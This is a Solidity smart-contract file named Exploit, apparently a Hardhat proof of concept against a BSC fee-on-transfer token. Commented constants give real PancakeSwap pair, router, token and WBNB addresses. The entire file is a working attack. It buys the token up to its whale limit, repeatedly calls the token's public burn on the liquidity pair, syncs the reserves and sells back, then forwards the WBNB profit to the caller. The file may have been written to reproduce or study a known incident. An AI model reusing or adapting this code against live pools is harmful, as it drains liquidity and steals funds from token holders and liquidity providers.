//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "./interfaces/IERC20.sol";
import "./interfaces/IPancakeRouter.sol";
import "./interfaces/IPancakeSwap.sol";
import "./interfaces/IWBNB.sol";

contract Exploit {

    // address PAIR = 0x02b0551B656509754285eeC81eE894338E14C5DD;
    // address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    // address VULNERABLE_TOKEN = 0xF40d33DE6737367A1cCB0cE6a056698D993A17E1;
    // address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address PAIR;
    address ROUTER;
    address VULNERABLE_TOKEN;
    address WBNB;

    IPancakeSwap pair;
    IPancakeRouter router;
    IERC20 vulnerableToken;
    IWBNB wbnb;

    address deployer;

    // LimitWhale of Vulnerable Token
    uint256 limitWhale = 20000000000000000000000;

    constructor(address Pair, address Router, address Vulnerable_Token, address Wbnb){
        deployer = msg.sender;
        PAIR = Pair;
        ROUTER = Router;
        VULNERABLE_TOKEN = Vulnerable_Token;
        WBNB = Wbnb;
         
        pair = IPancakeSwap(PAIR);
        router = IPancakeRouter(ROUTER);
        vulnerableToken = IERC20(VULNERABLE_TOKEN);
        wbnb = IWBNB(WBNB);
    }

    function attack() public payable{

        wbnb.deposit{value: msg.value}();
        console.log("Before depositing to WBNB, the WBNB balance is: ", wbnb.balanceOf(address(this)));
        
        // WBNB.transfer(0x02b0551B656509754285eeC81eE894338E14C5DD, 12e18);
        // pair.swap(0, 20_000e18, address(this), new bytes(0));

        vulnerableToken.approve(ROUTER, type(uint256).max);
        wbnb.approve(ROUTER, type(uint256).max);
        
        address [] memory path_WBNB_to_vulnerableToken = new address [] (2);
        path_WBNB_to_vulnerableToken[0]=WBNB; 
        path_WBNB_to_vulnerableToken[1]=VULNERABLE_TOKEN;
        
        uint256 amountIn = router.getAmountsIn(limitWhale-10000, path_WBNB_to_vulnerableToken)[0];
        console.log("amountIn: ", amountIn);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path_WBNB_to_vulnerableToken, address(this), block.timestamp+100);
        console.log("amountIn: ", amountIn);
        amountIn = router.getAmountsIn(limitWhale-10000, path_WBNB_to_vulnerableToken)[0];
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path_WBNB_to_vulnerableToken, address(this), block.timestamp+100);
        console.log("amountIn: ", amountIn);
        amountIn = router.getAmountsIn(limitWhale-10000, path_WBNB_to_vulnerableToken)[0];
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path_WBNB_to_vulnerableToken, address(this), block.timestamp+100);
        console.log("amountIn: ", amountIn);
        amountIn = router.getAmountsIn(limitWhale-10000, path_WBNB_to_vulnerableToken)[0];
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path_WBNB_to_vulnerableToken, address(this), block.timestamp+100);

        console.log("Swap succeed and the Burger amount is:", vulnerableToken.balanceOf(address(this)));
        console.log("After swapping, the WBNB balance is: ", wbnb.balanceOf(address(this)));

        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);
        vulnerableToken.burn(PAIR, limitWhale);

        console.log("Completed burning");

        pair.sync();
       
        address [] memory path_vulnerableToken_to_WBNB = new address [] (2);
        path_vulnerableToken_to_WBNB[0]=VULNERABLE_TOKEN;
        path_vulnerableToken_to_WBNB[1]=WBNB; 
        router.swapExactTokensForTokens(limitWhale-10000, 0, path_vulnerableToken_to_WBNB, address(this), block.timestamp+1000);
        router.swapExactTokensForTokens(limitWhale-10000, 0, path_vulnerableToken_to_WBNB, address(this), block.timestamp+1000);
        router.swapExactTokensForTokens(limitWhale-10000, 0, path_vulnerableToken_to_WBNB, address(this), block.timestamp+1000);
        router.swapExactTokensForTokens(limitWhale-10000, 0, path_vulnerableToken_to_WBNB, address(this), block.timestamp+1000);

        
        console.log("After burning and swapping, the Burger balance is: ", vulnerableToken.balanceOf(address(this)));
        console.log("After burning and swapping, the WBNB balance is: ", wbnb.balanceOf(address(this)));
        console.log("Profits: ", wbnb.balanceOf(address(this)) - 500 ether);

        wbnb.transfer(msg.sender, wbnb.balanceOf(address(this)) - 500 ether);
    }    
}
